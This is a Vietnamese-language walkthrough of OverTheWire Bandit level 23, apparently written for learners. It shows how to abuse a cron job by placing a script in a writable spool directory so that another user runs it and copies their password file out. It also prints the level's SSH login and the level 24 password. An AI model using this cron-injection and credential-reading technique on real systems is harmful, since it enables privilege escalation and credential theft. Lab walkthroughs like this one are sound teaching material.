# Level 23 -> Level 24

A program is running automatically at regular intervals from *cron*, the time-based job scheduler. Look in */etc/cron.d/* for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level:
`chmod`, `cron`, `crontab`, `crontab(5)`

---

## 1. THÔNG TIN KẾT NỐI (DÙNG PASSWORD TÌM ĐƯỢC TỪ BANDIT 22)

- **Host**: `bandit.labs.overthewire.org`
- **Port**: `2220`
- **Username**: `bandit23`
- **Password**: `gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw`

---

## 2. CÂU LỆNH KẾT NỐI SSH VÀO BANDIT 23

Mở Terminal / PowerShell và chạy:

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

---

## 3. KIẾN THỨC MỚI & THỬ THÁCH CỦA LEVEL 23

- **Thử thách**: Màn chơi này đánh dấu bước tiến lớn nhất của bạn: **Tự tay viết script Bash đầu tiên để khai thác hệ thống!**
- **Cơ chế hoạt động của cronjob màn này**:
  - Khi bạn đọc script `/usr/bin/cronjob_bandit24.sh`, bạn sẽ thấy:
    - User `bandit24` cứ mỗi phút sẽ vào thư mục `/var/spool/bandit24/foo`.
    - Nếu thấy bất kỳ script nào do `bandit23` tạo ra trong đó, nó sẽ **chạy script đó dưới quyền của bandit24**, sau đó xóa script đó đi!
  - **Ý tưởng khai thác**: Chúng ta sẽ viết một đoạn script nhỏ với nội dung: *"Hãy lấy mật khẩu của bandit24 ghi vào một file trong /tmp cho tôi"*. Sau đó đặt script này vào `/var/spool/bandit24/foo` và chờ `bandit24` tự động kích hoạt giúp chúng ta!

- **Lệnh cấp quyền thực thi - `chmod +x` (hoặc `chmod 777`)**:
  - Trong Linux, một file muốn chạy được thành chương trình bắt buộc phải có cờ quyền thực thi (`execute - x`).
  - Lệnh: `chmod +x <tên_file>` hoặc `chmod 777 <tên_file>` (cấp toàn bộ quyền đọc, ghi, chạy).

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 24

### Bước 1: Tạo thư mục làm việc riêng trong `/tmp`
```bash
mkdir /tmp/myhack_23
cd /tmp/myhack_23
```

### Bước 2: Viết một script shell để lấy mật khẩu
Tạo một file script tên là `getpass.sh` bằng lệnh `echo`:
```bash
echo '#!/bin/bash' > getpass.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/myhack_23/pass.txt' >> getpass.sh
```
*(Đoạn code trên có nghĩa: Khi script chạy, nó sẽ đọc file mật khẩu của bandit24 và ghi đè vào file `/tmp/myhack_23/pass.txt`).*

### Bước 3: Cấp toàn quyền thực thi cho script
```bash
chmod 777 getpass.sh
```

### Bước 4: Mở sẵn quyền ghi cho thư mục đích để bandit24 có thể tạo file
```bash
chmod 777 /tmp/myhack_23
```

### Bước 5: Copy script sang thư mục chờ của bandit24
```bash
cp getpass.sh /var/spool/bandit24/foo/
```

### Bước 6: Chờ tối đa 1 phút và lấy mật khẩu
Vì cronjob chạy mỗi phút một lần, bạn hãy chờ khoảng 30 đến 60 giây. Sau khi bandit24 tự động chạy xong file của bạn, file `pass.txt` sẽ xuất hiện:
```bash
cat /tmp/myhack_23/pass.txt
```

Màn hình sẽ in ra chuỗi mật khẩu chính thức của bandit24!

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 24

```text
Password bandit24: [hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv]
```
